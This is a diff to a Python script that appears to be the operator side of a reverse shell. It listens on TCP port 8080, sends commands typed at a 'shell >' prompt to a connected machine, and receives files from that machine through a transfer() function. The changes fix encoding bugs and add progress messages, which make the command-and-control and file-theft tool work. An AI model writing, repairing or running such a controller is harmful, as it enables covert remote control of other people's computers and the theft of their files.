@@ -13,21 +13,23 @@ PORT = 8080
 def transfer(conn, command):
 
     conn.send(command.encode())
-    f = open("test.txt", "wb")
+    f = open("test.txt", "w")
 
     while True:
-        bits = conn.recv(1024).decode()
+        print("[+] Recieving files...")
+        bits = conn.recv(1024)
+        print("[+]" + bits.decode())
 
-        if "Unable to find out the file" in bits:
+        if "Unable to find out the file" in bits.decode():
             print("[+] File not found")
             break
 
-        if bits.endswith("DONE"):
+        if bits.decode().endswith("DONE"):
             print("[+] Transfer completed")
             f.close()
             break
 
-        f.write(bits.encode())
+        f.write(bits.decode())
 
     f.close()
 
@@ -35,6 +37,7 @@ def transfer(conn, command):
 # initalize connection and send commands
 def connect():
 
+    print("[+] Listening for TCP connection on PORT " + str(PORT))
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((HOST, PORT))
     s.listen(1)
@@ -47,7 +50,7 @@ def connect():
         command = input("shell > ")
 
         if "terminate" in command:
-            conn.send("Closing connection...")
+            conn.send("Closing connection...".encode())
             conn.close()
             break
 
